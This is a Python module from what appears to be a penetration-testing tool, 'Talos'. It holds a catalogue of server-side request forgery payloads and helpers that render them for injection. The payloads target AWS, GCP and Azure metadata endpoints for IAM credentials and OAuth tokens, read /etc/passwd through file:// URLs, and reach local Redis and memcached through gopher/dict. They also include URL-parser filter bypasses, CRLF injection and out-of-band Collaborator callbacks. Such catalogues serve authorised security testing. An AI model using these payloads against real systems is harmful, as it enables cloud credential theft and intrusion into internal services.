"""
Module: talos.ssrf.payloads

Purpose:
    SSRF payload catalogue.

    Payloads **replace** the captured field value (URL sinks are not
    SQL-like append surfaces). ``suffix`` mode concatenates the original
    with a query/path fragment for apps that join a base URL.

    Families:
        loopback  — localhost / 127.0.0.1 / IPv6 / decimal / octal / hex
        cloud     — AWS / GCP / Azure / Alibaba / DigitalOcean / k8s IMDS
        protocol  — file / gopher / dict / ftp / ldap / docker / etcd
        bypass    — URL-parser diffs (@, #, IPv6-mapped, enclosed IP)
        encoded   — percent, double-percent, mixed-case scheme
        internal  — RFC1918, link-local, common internal names
        oast      — Burp Collaborator (only when --collaborator is set)

    Placeholders (materialized by render_payload):
        {COLLAB}  — Collaborator hostname
        {OAST}    — unique per-probe subdomain (technique-token.collab)
        {CANARY}  — unique per-probe token (path / query)

Dependencies: urllib.parse, talos.ssrf.models
Data flow: CLI / engine → generate_ssrf_payloads → job meta
Side effects: None.
"""

from __future__ import annotations

from typing import Optional
from urllib.parse import urlparse

from talos.ssrf.models import (
    FAMILIES,
    FAMILY_BYPASS,
    FAMILY_CLOUD,
    FAMILY_ENCODED,
    FAMILY_INTERNAL,
    FAMILY_LOOPBACK,
    FAMILY_OAST,
    FAMILY_PROTOCOL,
    INJECT_REPLACE,
    INJECT_SUFFIX,
    SINK_CLOUD,
    SINK_FILE,
    SINK_GENERIC,
    SINK_INTERNAL,
    SINK_LOOPBACK,
    SINK_OAST,
    SINK_SERVICE,
    SsrfPayload,
)


def _payload(
    *,
    technique: str,
    family: str,
    payload: str,
    description: str,
    sink: str = SINK_GENERIC,
    inject_mode: str = INJECT_REPLACE,
    requires_collaborator: bool = False,
) -> SsrfPayload:
    """Purpose: Build one catalogue row."""
    return SsrfPayload(
        technique=technique,
        family=family,
        payload=payload,
        description=description,
        sink=sink,
        inject_mode=inject_mode,
        requires_collaborator=requires_collaborator,
    )


def _base_payloads() -> list[SsrfPayload]:
    """Purpose: Full raw catalogue. Filtered later by --family / --technique."""
    return [
        # ---- Loopback ----------------------------------------------------
        _payload(
            technique="lb_http_127",
            family=FAMILY_LOOPBACK,
            payload="http://127.0.0.1/",
            description="Classic http://127.0.0.1/.",
            sink=SINK_LOOPBACK,
        ),
        _payload(
            technique="lb_http_127_80",
            family=FAMILY_LOOPBACK,
            payload="http://127.0.0.1:80/",
            description="Loopback with explicit port 80.",
            sink=SINK_LOOPBACK,
        ),
        _payload(
            technique="lb_https_127",
            family=FAMILY_LOOPBACK,
            payload="https://127.0.0.1/",
            description="HTTPS to 127.0.0.1.",
            sink=SINK_LOOPBACK,
        ),
        _payload(
            technique="lb_localhost",
            family=FAMILY_LOOPBACK,
            payload="http://localhost/",
            description="http://localhost/.",
            sink=SINK_LOOPBACK,
        ),
        _payload(
            technique="lb_localhost_80",
            family=FAMILY_LOOPBACK,
            payload="http://localhost:80/",
            description="localhost with explicit port 80.",
            sink=SINK_LOOPBACK,
        ),
        _payload(
            technique="lb_ipv6",
            family=FAMILY_LOOPBACK,
            payload="http://[::1]/",
            description="IPv6 loopback http://[::1]/.",
            sink=SINK_LOOPBACK,
        ),
        _payload(
            technique="lb_ipv6_80",
            family=FAMILY_LOOPBACK,
            payload="http://[::1]:80/",
            description="IPv6 loopback with port 80.",
            sink=SINK_LOOPBACK,
        ),
        _payload(
            technique="lb_zero",
            family=FAMILY_LOOPBACK,
            payload="http://0.0.0.0/",
            description="http://0.0.0.0/ (binds as local on many stacks).",
            sink=SINK_LOOPBACK,
        ),
        _payload(
            technique="lb_short_0",
            family=FAMILY_LOOPBACK,
            payload="http://0/",
            description="Short-form http://0/.",
            sink=SINK_LOOPBACK,
        ),
        _payload(
            technique="lb_127_1",
            family=FAMILY_LOOPBACK,
            payload="http://127.1/",
            description="Short-form 127.1 (often still loopback).",
            sink=SINK_LOOPBACK,
        ),
        _payload(
            technique="lb_decimal",
            family=FAMILY_LOOPBACK,
            payload="http://2130706433/",
            description="Decimal IP 2130706433 (127.0.0.1).",
            sink=SINK_LOOPBACK,
        ),
        _payload(
            technique="lb_octal",
            family=FAMILY_LOOPBACK,
            payload="http://0177.0.0.1/",
            description="Octal 0177.0.0.1 (127.0.0.1).",
            sink=SINK_LOOPBACK,
        ),
        _payload(
            technique="lb_hex",
            family=FAMILY_LOOPBACK,
            payload="http://0x7f.0.0.1/",
            description="Dotted hex 0x7f.0.0.1 (127.0.0.1).",
            sink=SINK_LOOPBACK,
        ),
        _payload(
            technique="lb_hex_dword",
            family=FAMILY_LOOPBACK,
            payload="http://0x7f000001/",
            description="Dword hex 0x7f000001 (127.0.0.1).",
            sink=SINK_LOOPBACK,
        ),
        _payload(
            technique="lb_ipv4_mapped",
            family=FAMILY_LOOPBACK,
            payload="http://[::ffff:127.0.0.1]/",
            description="IPv4-mapped IPv6 [::ffff:127.0.0.1].",
            sink=SINK_LOOPBACK,
        ),
        # ---- Cloud metadata ---------------------------------------------
        _payload(
            technique="cloud_aws_root",
            family=FAMILY_CLOUD,
            payload="http://169.254.169.254/",
            description="AWS IMDS link-local root.",
            sink=SINK_CLOUD,
        ),
        _payload(
            technique="cloud_aws_meta",
            family=FAMILY_CLOUD,
            payload="http://169.254.169.254/latest/meta-data/",
            description="AWS IMDS /latest/meta-data/.",
            sink=SINK_CLOUD,
        ),
        _payload(
            technique="cloud_aws_iam",
            family=FAMILY_CLOUD,
            payload="http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            description="AWS IMDS IAM role name listing.",
            sink=SINK_CLOUD,
        ),
        _payload(
            technique="cloud_aws_identity",
            family=FAMILY_CLOUD,
            payload="http://169.254.169.254/latest/dynamic/instance-identity/document",
            description="AWS instance-identity document (JSON).",
            sink=SINK_CLOUD,
        ),
        _payload(
            technique="cloud_aws_userdata",
            family=FAMILY_CLOUD,
            payload="http://169.254.169.254/latest/user-data",
            description="AWS user-data blob.",
            sink=SINK_CLOUD,
        ),
        _payload(
            technique="cloud_gcp_meta",
            family=FAMILY_CLOUD,
            payload="http://metadata.google.internal/computeMetadata/v1/",
            description="GCP metadata server (needs Metadata-Flavor on some paths).",
            sink=SINK_CLOUD,
        ),
        _payload(
            technique="cloud_gcp_token",
            family=FAMILY_CLOUD,
            payload="http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            description="GCP default service-account token.",
            sink=SINK_CLOUD,
        ),
        _payload(
            technique="cloud_azure_imds",
            family=FAMILY_CLOUD,
            payload="http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            description="Azure IMDS instance document.",
            sink=SINK_CLOUD,
        ),
        _payload(
            technique="cloud_azure_token",
            family=FAMILY_CLOUD,
            payload=(
                "http://169.254.169.254/metadata/identity/oauth2/token"
                "?api-version=2018-02-01&resource=https://management.azure.com/"
            ),
            description="Azure managed-identity OAuth token.",
            sink=SINK_CLOUD,
        ),
        _payload(
            technique="cloud_alibaba",
            family=FAMILY_CLOUD,
            payload="http://100.100.100.200/latest/meta-data/",
            description="Alibaba Cloud metadata.",
            sink=SINK_CLOUD,
        ),
        _payload(
            technique="cloud_do",
            family=FAMILY_CLOUD,
            payload="http://169.254.169.254/metadata/v1/",
            description="DigitalOcean metadata v1.",
            sink=SINK_CLOUD,
        ),
        _payload(
            technique="cloud_k8s",
            family=FAMILY_CLOUD,
            payload="https://kubernetes.default.svc/api",
            description="In-cluster Kubernetes API.",
            sink=SINK_CLOUD,
        ),
        # ---- Alternate schemes / local services -------------------------
        _payload(
            technique="proto_file_passwd",
            family=FAMILY_PROTOCOL,
            payload="file:///etc/passwd",
            description="file:///etc/passwd (Unix file SSRF).",
            sink=SINK_FILE,
        ),
        _payload(
            technique="proto_file_localhost",
            family=FAMILY_PROTOCOL,
            payload="file://localhost/etc/passwd",
            description="file://localhost/etc/passwd.",
            sink=SINK_FILE,
        ),
        _payload(
            technique="proto_file_win",
            family=FAMILY_PROTOCOL,
            payload="file:///C:/Windows/win.ini",
            description="file:///C:/Windows/win.ini.",
            sink=SINK_FILE,
        ),
        _payload(
            technique="proto_gopher_redis",
            family=FAMILY_PROTOCOL,
            payload="gopher://127.0.0.1:6379/_INFO",
            description="gopher:// to local Redis INFO.",
            sink=SINK_SERVICE,
        ),
        _payload(
            technique="proto_dict_memcached",
            family=FAMILY_PROTOCOL,
            payload="dict://127.0.0.1:11211/stat",
            description="dict:// to local memcached stats.",
            sink=SINK_SERVICE,
        ),
        _payload(
            technique="proto_ftp",
            family=FAMILY_PROTOCOL,
            payload="ftp://127.0.0.1/",
            description="ftp://127.0.0.1/.",
            sink=SINK_SERVICE,
        ),
        _payload(
            technique="proto_ldap",
            family=FAMILY_PROTOCOL,
            payload="ldap://127.0.0.1:389/",
            description="ldap://127.0.0.1:389/.",
            sink=SINK_SERVICE,
        ),
        _payload(
            technique="proto_http_redis",
            family=FAMILY_PROTOCOL,
            payload="http://127.0.0.1:6379/",
            description="HTTP to local Redis port.",
            sink=SINK_SERVICE,
        ),
        _payload(
            technique="proto_http_mysql",
            family=FAMILY_PROTOCOL,
            payload="http://127.0.0.1:3306/",
            description="HTTP to local MySQL port.",
            sink=SINK_SERVICE,
        ),
        _payload(
            technique="proto_http_es",
            family=FAMILY_PROTOCOL,
            payload="http://127.0.0.1:9200/",
            description="HTTP to local Elasticsearch.",
            sink=SINK_SERVICE,
        ),
        _payload(
            technique="proto_docker",
            family=FAMILY_PROTOCOL,
            payload="http://127.0.0.1:2375/version",
            description="Exposed Docker API /version.",
            sink=SINK_SERVICE,
        ),
        _payload(
            technique="proto_etcd",
            family=FAMILY_PROTOCOL,
            payload="http://127.0.0.1:2379/v2/keys",
            description="Exposed etcd v2 keys.",
            sink=SINK_SERVICE,
        ),
        _payload(
            technique="proto_netdoc",
            family=FAMILY_PROTOCOL,
            payload="netdoc:///etc/passwd",
            description="Java netdoc:///etc/passwd.",
            sink=SINK_FILE,
        ),
        # ---- Parser / filter bypass -------------------------------------
        _payload(
            technique="bypass_at_loopback",
            family=FAMILY_BYPASS,
            payload="http://evil.example@127.0.0.1/",
            description="Userinfo @127.0.0.1 (parser confusion).",
            sink=SINK_LOOPBACK,
        ),
        _payload(
            technique="bypass_fragment",
            family=FAMILY_BYPASS,
            payload="http://127.0.0.1#@evil.example",
            description="Fragment hides a decoy host.",
            sink=SINK_LOOPBACK,
        ),
        _payload(
            technique="bypass_enclosed",
            family=FAMILY_BYPASS,
            payload="http://127.0.0.1.nip.io/",
            description="Loopback via nip.io wildcard DNS.",
            sink=SINK_LOOPBACK,
        ),
        _payload(
            technique="bypass_tab",
            family=FAMILY_BYPASS,
            payload="http://127.0.0.1%09/",
            description="Tab (%09) after host.",
            sink=SINK_LOOPBACK,
        ),
        _payload(
            technique="bypass_crlf_host",
            family=FAMILY_BYPASS,
            payload="http://127.0.0.1%0d%0aX-Injected:%20ssrf",
            description="CRLF after loopback host.",
            sink=SINK_LOOPBACK,
        ),
        _payload(
            technique="bypass_mapped_compact",
            family=FAMILY_BYPASS,
            payload="http://[0:0:0:0:0:ffff:127.0.0.1]/",
            description="Expanded IPv4-mapped IPv6.",
            sink=SINK_LOOPBACK,
        ),
        _payload(
            technique="bypass_octal_full",
            family=FAMILY_BYPASS,
            payload="http://017700000001/",
            description="Full octal dword 017700000001 (127.0.0.1).",
            sink=SINK_LOOPBACK,
        ),
        _payload(
            technique="bypass_spoof_host",
            family=FAMILY_BYPASS,
            payload="http://127.0.0.1%23.whitelisted.example",
            description="Encoded # so a suffix looks like a whitelist host.",
            sink=SINK_LOOPBACK,
        ),
        _payload(
            technique="bypass_slash_scheme",
            family=FAMILY_BYPASS,
            payload="http:127.0.0.1",
            description="Scheme without // (some parsers still fetch).",
            sink=SINK_LOOPBACK,
        ),
        _payload(
            technique="bypass_backslash",
            family=FAMILY_BYPASS,
            payload="http://127.0.0.1\\@whitelisted.example/",
            description="Backslash before @ (IIS / urllib diffs).",
            sink=SINK_LOOPBACK,
        ),
        # ---- Encoded -----------------------------------------------------
        _payload(
            technique="enc_slashes",
            family=FAMILY_ENCODED,
            payload="http:%2f%2f127.0.0.1/",
            description="Encoded slashes after scheme.",
            sink=SINK_LOOPBACK,
        ),
        _payload(
            technique="enc_dots",
            family=FAMILY_ENCODED,
            payload="http://127%2e0%2e0%2e1/",
            description="Percent-encoded dots in 127.0.0.1.",
            sink=SINK_LOOPBACK,
        ),
        _payload(
            technique="enc_double_slash",
            family=FAMILY_ENCODED,
            payload="http:%252f%252f127.0.0.1/",
            description="Double-encoded slashes (%252f).",
            sink=SINK_LOOPBACK,
        ),
        _payload(
            technique="enc_mixed_scheme",
            family=FAMILY_ENCODED,
            payload="HttP://127.0.0.1/",
            description="Mixed-case scheme HttP://.",
            sink=SINK_LOOPBACK,
        ),
        _payload(
            technique="enc_scheme_hex",
            family=FAMILY_ENCODED,
            payload="%68%74%74%70://127.0.0.1/",
            description="Percent-encoded http scheme.",
            sink=SINK_LOOPBACK,
        ),
        _payload(
            technique="enc_cloud_dots",
            family=FAMILY_ENCODED,
            payload="http://169%2e254%2e169%2e254/latest/meta-data/",
            description="Encoded dots to AWS IMDS.",
            sink=SINK_CLOUD,
        ),
        _payload(
            technique="enc_file",
            family=FAMILY_ENCODED,
            payload="file:%2f%2f%2fetc%2fpasswd",
            description="Encoded file:///etc/passwd.",
            sink=SINK_FILE,
        ),
        # ---- Internal network -------------------------------------------
        _payload(
            technique="int_10",
            family=FAMILY_INTERNAL,
            payload="http://10.0.0.1/",
            description="RFC1918 10.0.0.1.",
            sink=SINK_INTERNAL,
        ),
        _payload(
            technique="int_192",
            family=FAMILY_INTERNAL,
            payload="http://192.168.1.1/",
            description="RFC1918 192.168.1.1.",
            sink=SINK_INTERNAL,
        ),
        _payload(
            technique="int_172",
            family=FAMILY_INTERNAL,
            payload="http://172.16.0.1/",
            description="RFC1918 172.16.0.1.",
            sink=SINK_INTERNAL,
        ),
        _payload(
            technique="int_linklocal",
            family=FAMILY_INTERNAL,
            payload="http://169.254.1.1/",
            description="Link-local 169.254.1.1 (not IMDS).",
            sink=SINK_INTERNAL,
        ),
        _payload(
            technique="int_metadata_name",
            family=FAMILY_INTERNAL,
            payload="http://metadata/",
            description="Bare hostname metadata/.",
            sink=SINK_CLOUD,
        ),
        _payload(
            technique="int_gateway",
            family=FAMILY_INTERNAL,
            payload="http://192.168.0.1/",
            description="Common gateway 192.168.0.1.",
            sink=SINK_INTERNAL,
        ),
        _payload(
            technique="int_suffix_orig",
            family=FAMILY_INTERNAL,
            payload="http://127.0.0.1/",
            description="Append /http://127.0.0.1/ onto the original URL-like value.",
            sink=SINK_LOOPBACK,
            inject_mode=INJECT_SUFFIX,
        ),
        # ---- OAST / Burp Collaborator -----------------------------------
        _payload(
            technique="oast_http",
            family=FAMILY_OAST,
            payload="http://{OAST}/ssrf/{CANARY}",
            description="HTTP to unique Collaborator subdomain.",
            sink=SINK_OAST,
            requires_collaborator=True,
        ),
        _payload(
            technique="oast_https",
            family=FAMILY_OAST,
            payload="https://{OAST}/ssrf/{CANARY}",
            description="HTTPS to unique Collaborator subdomain.",
            sink=SINK_OAST,
            requires_collaborator=True,
        ),
        _payload(
            technique="oast_bare",
            family=FAMILY_OAST,
            payload="http://{COLLAB}/ssrf/{CANARY}",
            description="HTTP to the Collaborator root host.",
            sink=SINK_OAST,
            requires_collaborator=True,
        ),
        _payload(
            technique="oast_proto_rel",
            family=FAMILY_OAST,
            payload="//{OAST}/ssrf/{CANARY}",
            description="Protocol-relative Collaborator URL.",
            sink=SINK_OAST,
            requires_collaborator=True,
        ),
        _payload(
            technique="oast_port80",
            family=FAMILY_OAST,
            payload="http://{OAST}:80/ssrf/{CANARY}",
            description="Collaborator with explicit port 80.",
            sink=SINK_OAST,
            requires_collaborator=True,
        ),
        _payload(
            technique="oast_userinfo",
            family=FAMILY_OAST,
            payload="http://ssrf@{OAST}/ssrf/{CANARY}",
            description="Collaborator with userinfo prefix.",
            sink=SINK_OAST,
            requires_collaborator=True,
        ),
        _payload(
            technique="oast_gopher",
            family=FAMILY_OAST,
            payload="gopher://{OAST}:80/_ssrf/{CANARY}",
            description="gopher:// to Collaborator (scheme smuggle).",
            sink=SINK_OAST,
            requires_collaborator=True,
        ),
        _payload(
            technique="oast_dns_only",
            family=FAMILY_OAST,
            payload="{OAST}",
            description="Bare Collaborator hostname (DNS-only OAST).",
            sink=SINK_OAST,
            requires_collaborator=True,
        ),
        _payload(
            technique="oast_suffix",
            family=FAMILY_OAST,
            payload="http://{OAST}/ssrf/{CANARY}",
            description="Append Collaborator URL onto the original value.",
            sink=SINK_OAST,
            inject_mode=INJECT_SUFFIX,
            requires_collaborator=True,
        ),
    ]


TECHNIQUE_CATALOG: tuple[dict[str, object], ...] = tuple(
    {
        "name": item.technique,
        "family": item.family,
        "description": item.description,
        "sink": item.sink,
        "inject_mode": item.inject_mode,
        "requires_collaborator": item.requires_collaborator,
    }
    for item in _base_payloads()
)

TECHNIQUE_NAMES: tuple[str, ...] = tuple(str(item["name"]) for item in TECHNIQUE_CATALOG)
TECHNIQUE_BY_NAME: dict[str, dict[str, object]] = {
    str(item["name"]): item for item in TECHNIQUE_CATALOG
}

DEFAULT_PAYLOAD_COUNT = len([p for p in _base_payloads() if not p.requires_collaborator])
OAST_PAYLOAD_COUNT = len([p for p in _base_payloads() if p.requires_collaborator])


def normalize_collaborator(raw: object) -> str:
    """
    Purpose:
        Accept a Burp Collaborator URL or host and return the hostname.
    Output:
        Lowercased hostname, or empty string when unset.
    Raises:
        ValueError when the value is present but not a usable host.
    """
    text = str(raw or "").strip()
    if not text:
        return ""
    if "://" not in text:
        text = "http://" + text
    parsed = urlparse(text)
    host = (parsed.hostname or "").strip().lower().rstrip(".")
    if not host or "." not in host:
        raise ValueError(
            "Collaborator must be a hostname or URL such as "
            "abc.oastify.com or https://abc.oastify.com"
        )
    if host in {"localhost", "example.com", "example.org"}:
        raise ValueError(
            f"refusing collaborator host {host!r}; paste a Burp Collaborator "
            "payload URL (oastify.com / burpcollaborator.net)."
        )
    return host


def oast_label(technique: str, token: str) -> str:
    """Purpose: DNS-safe unique label (max 63 chars)."""
    tech = "".join(ch if ch.isalnum() else "-" for ch in (technique or "ssrf"))
    tech = tech.strip("-")[:18] or "ssrf"
    tok = "".join(ch for ch in (token or "x") if ch.isalnum())[:10] or "x"
    return f"{tech}-{tok}".lower()


def render_payload(
    item: SsrfPayload,
    original: str,
    *,
    collaborator: str = "",
    token: str = "",
) -> str:
    """
    Purpose:
        Materialize placeholders and suffix-join when needed.
    Output:
        Replacement string ready to inject.
    """
    host = (collaborator or "").strip().lower().rstrip(".")
    tok = (token or "talos").strip() or "talos"
    oast = f"{oast_label(item.technique, tok)}.{host}" if host else ""
    rendered = (
        item.payload.replace("{COLLAB}", host)
        .replace("{OAST}", oast)
        .replace("{CANARY}", tok)
    )
    if item.inject_mode == INJECT_SUFFIX and (original or "").strip():
        base = original.rstrip("/")
        extra = rendered.lstrip("/")
        if "://" in extra or extra.startswith("//"):
            sep = "/" if "?" not in base and "#" not in base else ""
            return f"{base}{sep}{extra}"
        return f"{base}/{extra}"
    return rendered


def generate_ssrf_payloads(
    *,
    techniques: Optional[list[str]] = None,
    families: Optional[list[str]] = None,
    collaborator: str = "",
) -> list[SsrfPayload]:
    """
    Purpose:
        Return catalogue rows filtered by --technique / --family.
        OAST rows are omitted unless a collaborator host is set.
    Output:
        Non-empty list. Raises ValueError on unknown filters / missing collab.
    """
    payloads = list(_base_payloads())
    has_collab = bool((collaborator or "").strip())
    if not has_collab:
        payloads = [item for item in payloads if not item.requires_collaborator]

    if families:
        allow_fam = {name.strip() for name in families if name and name.strip()}
        unknown_fam = allow_fam - set(FAMILIES)
        if unknown_fam:
            raise ValueError(
                "unknown SSRF family: "
                + ", ".join(sorted(unknown_fam))
                + f". Expected one of: {', '.join(FAMILIES)}"
            )
        if FAMILY_OAST in allow_fam and not has_collab:
            raise ValueError(
                "family oast requires --collaborator (Burp Collaborator URL or host)."
            )
        payloads = [item for item in payloads if item.family in allow_fam]

    if techniques:
        allow = {name.strip() for name in techniques if name and name.strip()}
        known = {item.technique for item in _base_payloads()}
        unknown = allow - known
        if unknown:
            raise ValueError("unknown SSRF technique(s): " + ", ".join(sorted(unknown)))
        need_collab = [
            name
            for name in allow
            if TECHNIQUE_BY_NAME.get(name, {}).get("requires_collaborator")
        ]
        if need_collab and not has_collab:
            raise ValueError(
                "technique(s) require --collaborator: " + ", ".join(sorted(need_collab))
            )
        payloads = [item for item in payloads if item.technique in allow]
        missing = allow - {item.technique for item in payloads}
        if missing:
            raise ValueError(
                "SSRF technique(s) not available for the selected family"
                + (" or collaborator" if not has_collab else "")
                + ": "
                + ", ".join(sorted(missing))
            )
    if not payloads:
        raise ValueError(
            "no SSRF payloads match the selected filters"
            + ("" if has_collab else " (OAST payloads need --collaborator)")
        )
    return payloads
